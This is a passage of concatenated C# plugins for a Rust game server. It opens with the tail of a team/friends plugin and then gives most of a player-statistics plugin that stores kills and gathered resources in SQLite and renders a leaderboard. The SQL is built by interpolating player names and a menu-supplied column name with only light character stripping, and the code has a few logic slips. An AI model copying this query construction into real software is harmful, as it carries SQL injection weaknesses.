                            List<Network.Connection> sendto = Network.Net.sv.connections.Where(x => player.Team.members.Contains(x.userid)).ToList();
                            string text = config.prefix + $"Теперь туррели игрока <color=#F65050>{player.displayName}</color> для вас безобидны.";
                            ConsoleNetwork.SendClientCommand(sendto, "chat.add", 0, player.UserIDString, text);
                        }
                    }
                }
                
            }
            else
            {
                if (player.Team == null) player.Command("chat.add", 2, 0, config.prefix + $"Создайте сначала команду!\n             <color=#F65050>/{command} create</color> - создать команду.");
                else player.Command("chat.add", 2, 0, config.prefix + $"\n\n     <color=#F65050>/{command} name</color> <color=#F65050><ТЕГ></color> - изменить тим <color=#F65050>ТЕГ</color>.\n      <color=#F65050>/{command} invite</color> <color=#F65050>никнейм</color> - пригласить в команду \n {onoff(settings.codelock)} <color=#F65050>/{command} codelock</color> - разрешить тиммейтам пользоваться вашими замками.\n {onoff(setplayers[player.userID].turret)} <color=#F65050>/{command} turret</color> - авторизовывать тиммейтов в ваших туреллях, когда они на них агряться.\n {onoff(setplayers[player.userID].ff)} <color=#F65050>/{command} ff</color> - выключить урон по тиммейтам.");
            }
        }

        private bool IsPvp(ulong id)
        {
            settings settings;
            if (!setplayers.TryGetValue(id, out settings)) return true;
            return settings.ff;
        }

        private bool IsTurret(ulong id)
        {
            settings settings;
            if (!setplayers.TryGetValue(id, out settings)) return true;
            return settings.turret;
        }

        private bool IsCodelock(ulong id)
        {
            settings settings;
            if (!setplayers.TryGetValue(id, out settings)) return true;
            return settings.codelock;
        }

        string onoff(bool on)
        {
            if (on) return "<color=#29F500> - On -</color>";
            else return "<color=#FF0B00>- Off -</color>";
        }
    }
}

// --- End of file: Friendsbyfermens.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/Stats.cs ---
// --- Original Local Path: HudRust/Stats.cs ---

using Newtonsoft.Json.Linq;
using Oxide.Core;
using Oxide.Core.Database;
using Oxide.Core.Plugins;
using Oxide.Core.SQLite.Libraries;
using Oxide.Game.Rust.Cui;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("Stats", "VooDoo", "1.0.0")]
    [Description("Player's stats")]
    public class Stats : RustPlugin
    {
        public static Stats instance;
        [PluginReference] Plugin XMenu;

        public static SQLite SQLite = Interface.Oxide.GetLibrary<SQLite>();
        public static Connection SQLiteConnection;
        public static string DataBase = "Stats.db";

        #region Config
        private PluginConfig config;
        private class PluginConfig
        {
            public ColorConfig colorConfig;
            public class ColorConfig
            {
                public string menuContentHighlighting;
                public string menuContentHighlightingalternative;

                public string menuContentText;
                public string menuContentTextAlternative;

                public string gradientColor;
            }
        }

        private void Init()
        {
            config = Config.ReadObject<PluginConfig>();
        }

        protected override void LoadDefaultConfig()
        {
            Config.WriteObject(GetDefaultConfig(), true);
        }

        private PluginConfig GetDefaultConfig()
        {
            return new PluginConfig
            {
                colorConfig = new PluginConfig.ColorConfig()
                {
                    menuContentHighlighting = "#0000007f",
                    menuContentHighlightingalternative = "#FFFFFF10",

                    menuContentTextAlternative = "#90BD47",
                    menuContentText = "#FFFFFFAA",

                    gradientColor = "#00000099",
                },
            };
        }
        #endregion

        #region U'Mod Hook's
        Timer TimerInitialize;
        private void OnServerInitialized()
        {
            instance = this;
            TimerInitialize = timer.Every(5f, () =>
            {
                if (XMenu.IsLoaded)
                {
                    XMenu.Call("API_RegisterMenu", this.Name, "Stats", "assets/icons/market.png", "RenderStats", null);

                    cmd.AddChatCommand("stats", this, (p, cmd, args) => rust.RunClientCommand(p, "custommenu true Stats"));
                    TimerInitialize.Destroy();
                }
            });

            #region Initialize
            try
            {
                SQLiteConnection = SQLite.OpenDb(DataBase, this);
                if (SQLiteConnection == null)
                {
                    PrintWarning($"Couldn't open DataBase");
                }
                else
                {
                    SQLite.Insert(Core.Database.Sql.Builder.Append("CREATE TABLE IF NOT EXISTS Stats (" +
                              "id INTEGER PRIMARY KEY AUTOINCREMENT, " +
                              "steamid BIGINT(17) UNIQUE, " +
                              "name VARCHAR(256), " +
                              "kills INTEGER, " +
                              "death INTEGER, " +
                              "suicides INTEGER, " +
                              "killanimal INTEGER, " +
                              "killnpc INTEGER, " +
                              "killhelicopter INTEGER, " +
                              "killbradley INTEGER, " +
                              "wood INTEGER, " +
                              "stones INTEGER, " +
                              "metalore INTEGER, " +
                              "sulfurore INTEGER, " +
                              "hqmetalore INTEGER, " +
                              "resources INTEGER);"), SQLiteConnection);
                }

                timer.Once(3f, () => { foreach (var p in BasePlayer.activePlayerList) { OnPlayerConnected(p); } });
            }
            catch (Exception e)
            {
                PrintWarning(e.Message);
            }
            #endregion
        }

        void Unload()
        {
            SQLite.CloseDb(SQLiteConnection);
        }

        void OnPlayerConnected(BasePlayer player)
        {
            InsertDataBase(player);
        }

        #region Insert/Update
        void InsertDataBase(BasePlayer player)
        {
            try
            {
                string displayName = player.displayName.Replace("\'", "").Replace("\"", "").Replace("@", "");
                SQLite.Insert(Core.Database.Sql.Builder.Append($"INSERT OR IGNORE into Stats ( steamid, name, kills, death, suicides, killanimal, killnpc, killhelicopter, killbradley, wood, stones, metalore, sulfurore, hqmetalore, resources ) values ( {player.userID}, '{Name}', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 );"), SQLiteConnection);
                SQLite.Insert(Core.Database.Sql.Builder.Append($@"UPDATE Stats SET name = '{displayName}' WHERE steamid={player.userID};"), SQLiteConnection);
            }
            catch (Exception e)
            {
                PrintWarning(e.Message);
            }
        }

        void UpdateDataBase(BasePlayer player, string Name, int Value)
        {
            try
            {
                string ValueName = Name.Replace(".", "").Replace("@", "");
                SQLite.Insert(Core.Database.Sql.Builder.Append($"UPDATE Stats SET {ValueName} = {ValueName} + {Value} WHERE steamid={player.userID};"), SQLiteConnection);
            }
            catch (Exception e)
            {
                PrintWarning(e.Message);
            }
        }
        #endregion

        #region OnEntityDeath
        private Dictionary<uint, BasePlayer> lastHelicopterAttack = new Dictionary<uint, BasePlayer>();
        private Dictionary<uint, BasePlayer> lastBradleyAttack = new Dictionary<uint, BasePlayer>();
        void OnEntityTakeDamage(BaseCombatEntity entity, HitInfo info)
        {
            if (entity is BaseHelicopter && info.InitiatorPlayer != null)
                lastHelicopterAttack[entity.net.ID] = info.InitiatorPlayer;

            if (entity is BradleyAPC && info.InitiatorPlayer != null)
                lastBradleyAttack[entity.net.ID] = info.InitiatorPlayer;
        }

        void OnEntityDeath(BaseCombatEntity entity, HitInfo info)
        {
            if (info == null)
                return;

            try
            {
                if (entity is BaseAnimalNPC)
                {
                    if (info.InitiatorPlayer != null)
                    {
                        UpdateDataBase(info.InitiatorPlayer, "killanimal", 1);
                    }
                    return;
                }
                if (entity is HTNPlayer || entity is NPCPlayer)
                {
                    if (info != null && info.InitiatorPlayer != null)
                    {
                        UpdateDataBase(info.InitiatorPlayer, "killnpc", 1);
                    }
                    return;
                }
                if (entity is BasePlayer)
                {
                    if (info.InitiatorPlayer != null && !(info.InitiatorPlayer is HTNPlayer) && !(info.InitiatorPlayer is NPCPlayer))
                    {
                        if ((entity as BasePlayer).userID == info.InitiatorPlayer.userID)
                        {
                            UpdateDataBase(info.InitiatorPlayer, "suicides", 1);
                        }
                        else
                        {
                            UpdateDataBase(info.InitiatorPlayer, "kills", 1);
                            UpdateDataBase((entity as BasePlayer), "death", 1);
                        }
                    }
                    else
                    {
                        UpdateDataBase((entity as BasePlayer), "death", 1);
                    }
                    return;
                }

                if (entity is BaseHelicopter || entity is CH47Helicopter)
                {
                    if (info.InitiatorPlayer != null)
                    {
                        UpdateDataBase(info.InitiatorPlayer, "killhelicopter", 1);
                    }
                    else
                    {
                        if (lastHelicopterAttack.ContainsKey(entity.net.ID))
                        {
                            UpdateDataBase(lastHelicopterAttack[entity.net.ID], "killhelicopter", 1);
                        }
                    }
                    return;
                }

                if (entity is BradleyAPC)
                {
                    if (info.InitiatorPlayer != null)
                    {
                        UpdateDataBase(info.InitiatorPlayer, "killbradley", 1);
                    }
                    else
                    {
                        if (lastBradleyAttack.ContainsKey(entity.net.ID))
                        {
                            UpdateDataBase(lastHelicopterAttack[entity.net.ID], "killbradley", 1);
                        }
                    }
                    return;
                }
            }
            catch (Exception ex)
            {
                PrintWarning(entity.PrefabName + "\n" + (info != null ? "info != null" : "info == null"));
                PrintWarning(entity.PrefabName + "\n" + (info.InitiatorPlayer != null ? $"{info.InitiatorPlayer.displayName} Initiator player != null" : "initiator player == null"));
                PrintWarning(entity.PrefabName + "\n" + ex.ToString());
            }
        }
        #endregion

        #region Resources
        void OnPlayerGather(BasePlayer player, Item item)
        {
            if (player == null) return;

            switch (item.info.shortname)
            {
                case "wood": UpdateDataBase(player, "wood", item.amount); break;
                case "stones": UpdateDataBase(player, "stones", item.amount); break;
                case "sulfur.ore": UpdateDataBase(player, "sulfurore", item.amount); break;
                case "metal.ore": UpdateDataBase(player, "metalore", item.amount); break;
                case "hq.metal.ore": UpdateDataBase(player, "hqmetalore", item.amount); break;
            }
            UpdateDataBase(player, "resources", item.amount);
        }

        void OnDispenserGather(ResourceDispenser dispenser, BaseEntity entity, Item item) => OnPlayerGather(entity?.ToPlayer(), item);

        void OnDispenserBonus(ResourceDispenser dispenser, BasePlayer player, Item item) => OnPlayerGather(player, item);

        void OnGrowableGather(GrowableEntity plant, Item item, BasePlayer player) => OnPlayerGather(player, item);

        void OnCollectiblePickup(Item item, BasePlayer player) => OnPlayerGather(player, item);
        #endregion
        #endregion

        #region UI
        #region Layers
        public const string MenuLayer = "XMenu";
        public const string MenuItemsLayer = "XMenu.MenuItems";
        public const string MenuSubItemsLayer = "XMenu.MenuSubItems";
        public const string MenuContent = "XMenu.Content";
        #endregion

        private void RenderStats(ulong userID, object[] objects)
        {
            CuiElementContainer Container = (CuiElementContainer)objects[0];
            bool FullRender = (bool)objects[1];
            string Name = (string)objects[2];
            int ID = (int)objects[3];
            int Page = (int)objects[4];
            string StatName = string.IsNullOrEmpty((string)objects[5]) ? "Kills" : (string)objects[5];

            BasePlayer player = BasePlayer.FindByID(userID);
            Container.Add(new CuiElement
            {
                Name = MenuContent,
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = "0 0 0 0",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-430 -230",
                            OffsetMax = "490 270"
                        },
                    }
            });

            #region Table
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Title",
                Parent = MenuContent,
                Components =
                    {
                        new CuiTextComponent
                        {
                            Text = $"<color={config.colorConfig.menuContentText}><b>СТАТИСТИКА ЛУЧШИХ ИГРОКОВ </b></color>",
                            Align = TextAnchor.MiddleCenter,
                            FontSize = 32,
                            Font = "robotocondensed-regular.ttf"
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = $"0 -50",
                            OffsetMax = $"920 0",
                        }
                    }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.Name",
                Parent = MenuContent,
                Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"77.5 -85",
                                    OffsetMax = $"190 -60"
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.NameTitle",
                Parent = MenuContent + $".Content.Stats.Name",
                Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = $"<color={config.colorConfig.menuContentText}>Никнейм</color>",
                                    Align = TextAnchor.MiddleCenter,
                                    FontSize = 14,
                                    Font = "robotocondensed-regular.ttf"
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 0",
                                    AnchorMax = "1 1",
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.Kills",
                Parent = MenuContent,
                Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"193 -85",
                                    OffsetMax = $"263 -60"
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.KillsTitle",
                Parent = MenuContent + $".Content.Stats.Kills",
                Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = $"<color={config.colorConfig.menuContentText}>Убийств</color>",
                                    Align = TextAnchor.MiddleCenter,
                                    FontSize = 14,
                                    Font = "robotocondensed-regular.ttf"
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 0",
                                    AnchorMax = "1 1",
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.Deaths",
                Parent = MenuContent,
                Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"266 -85",
                                    OffsetMax = $"336 -60"
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.DeathsTitle",
                Parent = MenuContent + $".Content.Stats.Deaths",
                Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = $"<color={config.colorConfig.menuContentText}>Смертей</color>",
                                    Align = TextAnchor.MiddleCenter,
                                    FontSize = 14,
                                    Font = "robotocondensed-regular.ttf"
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 0",
                                    AnchorMax = "1 1",
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.KillNPC",
                Parent = MenuContent,
                Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"339 -85",
                                    OffsetMax = $"409 -60"
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.KillNPCTitle",
                Parent = MenuContent + $".Content.Stats.KillNPC",
                Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = $"<color={config.colorConfig.menuContentText}>Ученых</color>",
                                    Align = TextAnchor.MiddleCenter,
                                    FontSize = 14,
                                    Font = "robotocondensed-regular.ttf"
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 0",
                                    AnchorMax = "1 1",
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.KillAnimals",
                Parent = MenuContent,
                Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"412 -85",
                                    OffsetMax = $"482 -60"
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.KillAnimalsTitle",
                Parent = MenuContent + $".Content.Stats.KillAnimals",
                Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = $"<color={config.colorConfig.menuContentText}>Животных</color>",
                                    Align = TextAnchor.MiddleCenter,
                                    FontSize = 14,
                                    Font = "robotocondensed-regular.ttf"
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 0",
                                    AnchorMax = "1 1",
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.MetalOre",
                Parent = MenuContent,
                Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"485 -85",
                                    OffsetMax = $"555 -60"
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.MetalOreTitle",
                Parent = MenuContent + $".Content.Stats.MetalOre",
                Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = $"<color={config.colorConfig.menuContentText}>Металл</color>",
                                    Align = TextAnchor.MiddleCenter,
                                    FontSize = 14,
                                    Font = "robotocondensed-regular.ttf"
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 0",
                                    AnchorMax = "1 1",
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.SulfurOre",
                Parent = MenuContent,
                Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"558 -85",
                                    OffsetMax = $"628 -60"
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.SulfurOreTitle",
                Parent = MenuContent + $".Content.Stats.SulfurOre",
                Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = $"<color={config.colorConfig.menuContentText}>Сера</color>",
                                    Align = TextAnchor.MiddleCenter,
                                    FontSize = 14,
                                    Font = "robotocondensed-regular.ttf"
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 0",
                                    AnchorMax = "1 1",
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.HQMetal",
                Parent = MenuContent,
                Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"631 -85",
                                    OffsetMax = $"701 -60"
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.HQMetalTitle",
                Parent = MenuContent + $".Content.Stats.HQMetal",
                Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = $"<color={config.colorConfig.menuContentText}>МВК</color>",
                                    Align = TextAnchor.MiddleCenter,
                                    FontSize = 14,
                                    Font = "robotocondensed-regular.ttf"
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 0",
                                    AnchorMax = "1 1",
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.Res",
                Parent = MenuContent,
                Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"704 -85",
                                    OffsetMax = $"822.5 -60"
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Content.Stats.ResTitle",
                Parent = MenuContent + $".Content.Stats.Res",
                Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = $"<color={config.colorConfig.menuContentText}>Всего ресурсов</color>",
                                    Align = TextAnchor.MiddleCenter,
                                    FontSize = 14,
                                    Font = "robotocondensed-regular.ttf"
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 0",
                                    AnchorMax = "1 1",
                                }
                            }
            });
            #endregion

            #region Buttons
            int y = 0;
            Container.Add(new CuiButton
            {
                Button = { Color = "0 0 0 0", Command = $"" },
                RectTransform = {   AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"77.5 {-85 - y * 35}",
                                        OffsetMax = $"190 {-60 - y * 35}" },
                Text = { Text = "", Align = TextAnchor.MiddleCenter }
            }, MenuContent, MenuContent + $".Content.Stats.Btn.Name");
            Container.Add(new CuiButton
            {
                Button = { Color = "0 0 0 0", Command = $"custommenu false Stats 0 0 kills" },
                RectTransform = {   AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"193 {-85 - y * 35}",
                                        OffsetMax = $"263 {-60 - y * 35}" },
                Text = { Text = "", Align = TextAnchor.MiddleCenter }
            }, MenuContent, MenuContent + $".Content.Stats.Btn.Kills");
            Container.Add(new CuiButton
            {
                Button = { Color = "0 0 0 0", Command = $"custommenu false Stats 0 0 death" },
                RectTransform = {   AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"266 {-85 - y * 35}",
                                        OffsetMax = $"336 {-60 - y * 35}" },
                Text = { Text = "", Align = TextAnchor.MiddleCenter }
            }, MenuContent, MenuContent + $".Content.Stats.Btn.Deaths");
            Container.Add(new CuiButton
            {
                Button = { Color = "0 0 0 0", Command = $"custommenu false Stats 0 0 killnpc" },
                RectTransform = {   AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"339 {-85 - y * 35}",
                                        OffsetMax = $"409 {-60 - y * 35}" },
                Text = { Text = "", Align = TextAnchor.MiddleCenter }
            }, MenuContent, MenuContent + $".Content.Stats.Btn.KillNPC");
            Container.Add(new CuiButton
            {
                Button = { Color = "0 0 0 0", Command = $"custommenu false Stats 0 0 killanimal" },
                RectTransform = {   AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"412 {-85 - y * 35}",
                                        OffsetMax = $"482 {-60 - y * 35}" },
                Text = { Text = "", Align = TextAnchor.MiddleCenter }
            }, MenuContent, MenuContent + $".Content.Stats.Btn.KillAnimals");
            Container.Add(new CuiButton
            {
                Button = { Color = "0 0 0 0", Command = $"custommenu false Stats 0 0 metalore" },
                RectTransform = {   AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"485 {-85 - y * 35}",
                                        OffsetMax = $"555 {-60 - y * 35}" },
                Text = { Text = "", Align = TextAnchor.MiddleCenter }
            }, MenuContent, MenuContent + $".Content.Stats.Btn.MetalOre");
            Container.Add(new CuiButton
            {
                Button = { Color = "0 0 0 0", Command = $"custommenu false Stats 0 0 sulfurore" },
                RectTransform = {   AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"558 {-85 - y * 35}",
                                        OffsetMax = $"628 {-60 - y * 35}" },
                Text = { Text = "", Align = TextAnchor.MiddleCenter }
            }, MenuContent, MenuContent + $".Content.Stats.Btn.SulfurOre");
            Container.Add(new CuiButton
            {
                Button = { Color = "0 0 0 0", Command = $"custommenu false Stats 0 0 hqmetalore" },
                RectTransform = {   AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"631 {-85 - y * 35}",
                                        OffsetMax = $"701 {-60 - y * 35}" },
                Text = { Text = "", Align = TextAnchor.MiddleCenter }
            }, MenuContent, MenuContent + $".Content.Stats.Btn.HQMetal");
            Container.Add(new CuiButton
            {
                Button = { Color = "0 0 0 0", Command = $"custommenu false Stats 0 0 resources" },
                RectTransform = {   AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"704 {-85 - y * 35}",
                                        OffsetMax = $"822.5 {-60 - y * 35}" },
                Text = { Text = "", Align = TextAnchor.MiddleCenter }
            }, MenuContent, MenuContent + $".Content.Stats.Btn.Res");
            #endregion

            SelectDataBase(player, StatName, 12, 0);
            SelectPlayer(player);
        }

        public void SelectDataBase(BasePlayer player, string Name, int count, int offset)
        {
            try
            {
                CuiElementContainer Container = new CuiElementContainer();
                string ValueName = Name.Replace(".", "");
                var SQLString = Core.Database.Sql.Builder.Append($"SELECT * FROM Stats ORDER BY {ValueName} DESC LIMIT {count} OFFSET {offset};");
                SQLite.Query(SQLString, SQLiteConnection, obj =>
                {
                    if (obj != null)
                    {
                        for (int i = 0, y = 0; i < obj.Count; i++, y++)
                        {
                            string color = HexToRustFormat(config.colorConfig.menuContentHighlighting);
                            if (instance.IsEven(y)) color = HexToRustFormat(config.colorConfig.menuContentHighlightingalternative);
                            Container.Add(new CuiElement
                            {
                                Name = MenuLayer + $".Content.Stats.{i}",
                                Parent = MenuContent,
                                Components =
                                {
                                    new CuiImageComponent
                                    {
                                        Color = color,
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"77.5 {-120 - y * 30}",
                                        OffsetMax = $"822.5 {-95 - y * 30}"
                                    }
                                }
                            });
                            Container.Add(new CuiElement
                            {
                                Name = MenuContent + $".Content.Stats.Name.{i}",
                                Parent = MenuContent,
                                Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentText}>{obj.ElementAt(i)["name"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 10,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"77.5 {-120 - y * 30}",
                                        OffsetMax = $"190 {-95 - y * 30}"
                                    }
                                }
                            });
                            Container.Add(new CuiElement
                            {
                                Name = MenuContent + $".Content.Stats.Kills.{i}",
                                Parent = MenuContent,
                                Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentText}>{obj.ElementAt(i)["kills"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"193 {-120 - y * 30}",
                                        OffsetMax = $"263 {-95 - y * 30}"
                                    }
                                }
                            });
                            Container.Add(new CuiElement
                            {
                                Name = MenuContent + $".Content.Stats.Deaths.{i}",
                                Parent = MenuContent,
                                Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentText}>{obj.ElementAt(i)["death"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"266 {-120 - y * 30}",
                                        OffsetMax = $"336 {-95 - y * 30}"
                                    }
                                }
                            });
                            Container.Add(new CuiElement
                            {
                                Name = MenuContent + $".Content.Stats.KillNPC.{i}",
                                Parent = MenuContent,
                                Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentText}>{obj.ElementAt(i)["killnpc"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"339 {-120 - y * 30}",
                                        OffsetMax = $"409 {-95 - y * 30}"
                                    }
                                }
                            });
                            Container.Add(new CuiElement
                            {
                                Name = MenuContent + $".Content.Stats.KillAnimals.{i}",
                                Parent = MenuContent,
                                Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentText}>{obj.ElementAt(i)["killanimal"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"412 {-120 - y * 30}",
                                        OffsetMax = $"482 {-95 - y * 30}"
                                    }
                                }
                            });
                            Container.Add(new CuiElement
                            {
                                Name = MenuContent + $".Content.Stats.MetalOre.{i}",
                                Parent = MenuContent,
                                Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentText}>{obj.ElementAt(i)["metalore"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"485 {-120 - y * 30}",
                                        OffsetMax = $"555 {-95 - y * 30}"
                                    }
                                }
                            });
                            Container.Add(new CuiElement
                            {
                                Name = MenuContent + $".Content.Stats.SulfurOre.{i}",
                                Parent = MenuContent,
                                Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentText}>{obj.ElementAt(i)["sulfurore"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"558 {-120 - y * 30}",
                                        OffsetMax = $"628 {-95 - y * 30}"
                                    }
                                }
                            });
                            Container.Add(new CuiElement
                            {
                                Name = MenuContent + $".Content.Stats.HQMeta;.{i}",
                                Parent = MenuContent,
                                Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentText}>{obj.ElementAt(i)["hqmetalore"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"631 {-120 - y * 30}",
                                        OffsetMax = $"701 {-95 - y * 30}"
                                    }
                                }
                            });
                            Container.Add(new CuiElement
                            {
                                Name = MenuContent + $".Content.Stats.Res.{i}",
                                Parent = MenuContent,
                                Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentText}>{obj.ElementAt(i)["resources"]}</color>",
